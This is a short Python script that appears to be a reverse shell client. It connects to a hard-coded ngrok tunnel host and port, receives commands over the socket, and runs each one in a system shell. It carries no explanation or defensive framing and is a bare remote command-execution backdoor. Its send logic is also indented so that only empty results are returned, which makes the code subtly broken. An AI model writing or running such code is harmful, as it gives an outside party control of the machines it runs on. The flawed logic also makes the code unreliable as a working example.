import sys
import socket
import subprocess

serv_add = '4.tcp.eu.ngrok.io'  #str(input("Enter Server Address: "))
portnum = 14193                 #int(input("Enter Port Number: "))

s = socket.socket()
s.connect((serv_add, portnum))
msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command: {cmd}')
    if cmd.lower() in ['exit']:
        break

    try:
        result = subprocess.check_output(cmd, stderr = subprocess.STDOUT, shell = True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed Successfully'.encode()
        s.send(result)


s.close()
